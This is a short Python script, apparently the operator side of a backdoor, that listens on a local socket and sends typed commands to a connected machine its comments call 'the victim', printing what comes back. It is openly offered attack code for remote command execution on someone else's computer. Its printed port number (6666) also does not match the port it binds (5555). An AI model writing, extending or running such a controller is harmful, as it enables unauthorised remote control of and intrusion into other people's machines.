import socket
import pyfiglet
import termcolor

# binding of socket to the localhost
s = socket.socket()
s.bind(("127.0.0.1", 5555)) #change this if needed
s.listen()

print("Server listening on port 6666...")

while True:
    try:
        # This means that the backdoor is created and the connection is accepted expect if an error occurs
        conn, addr = s.accept()
        print(f"Connection established with {addr}")
        while True:
            # This is an input which you can put in, to send a command to the victim to execute on their computer
            command = input(f'{addr}> ').strip()  
            if command.lower() == 'exit':
                print("Closing server.")
                conn.sendall(command.encode("UTF-8"))  # Send exit command
                break

            # Send the command
            conn.sendall(command.encode("UTF-8"))
            # Receive and print the output from the client
            output = conn.recv(1024).decode()
            print(output)

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Client Closed
        conn.close()

